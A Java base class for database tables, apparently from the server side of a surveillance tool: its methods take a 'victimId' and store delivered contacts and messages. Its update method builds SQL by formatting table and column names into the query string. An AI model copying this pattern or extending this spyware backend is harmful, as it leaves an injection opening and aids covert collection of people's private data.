package com.theah64.xrob.api.database.tables;

import com.sun.istack.internal.NotNull;
import com.sun.istack.internal.Nullable;
import com.theah64.xrob.api.database.Connection;
import com.theah64.xrob.api.models.Delivery;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.util.List;

/**
 * Created by theapache64 on 11/22/2015.
 */
public class BaseTable<T> {

    public static final String COLUMN_ID = "id";
    public static final String COLUMN_NAME = "name";
    private static final String ERROR_MESSAGE_UNDEFINED_METHOD = "Undefined method.";

    public T get(final String column, final String value) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public boolean add(@Nullable final String victimId, final JSONObject jsonObject) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }


    public boolean add(T newInstance) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public void addv2(T newInstance) throws RuntimeException {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public String get(final String byColumn, final String byValues, final String columnToReturn) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public boolean update(String whereColumn, String whereColumnValue, String updateColumn, String newUpdateColumnValue) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public T get(final String column1, final String value1, final String column2, final String value2) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public void addv2(@Nullable final String victimId, final JSONArray jsonArray) throws RuntimeException, JSONException {
        throw new RuntimeException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    protected List<T> parse(final String victimId, @NotNull JSONArray jsonArray) throws JSONException {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public boolean update(T t) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    protected boolean update(String tableName, String whereColumn, String whereColumnValue, String columnToUpdate, String valueToUpdate) {

        boolean isEdited = false;
        final String query = String.format("UPDATE %s SET %s = ? WHERE %s = ?;", tableName, columnToUpdate, whereColumn);
        final java.sql.Connection con = Connection.getConnection();

        try {
            final PreparedStatement ps = con.prepareStatement(query);
            ps.setString(1, valueToUpdate);
            ps.setString(2, whereColumnValue);

            isEdited = ps.executeUpdate() == 1;
            ps.close();

        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                con.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
        return isEdited;
    }


    protected boolean isExist(final T t) {
        throw new IllegalArgumentException(ERROR_MESSAGE_UNDEFINED_METHOD);
    }

    public static class Factory {
        public static BaseTable getTable(String deliveryType) {
            switch (deliveryType) {

                case Delivery.TYPE_CONTACTS:
                    return Contacts.getInstance();

                //Returning message table
                case Delivery.TYPE_MESSAGES:
                    return Messages.getInstance();

                default:
                    throw new IllegalArgumentException("No table defined for the type " + deliveryType);
            }
        }
    }
}
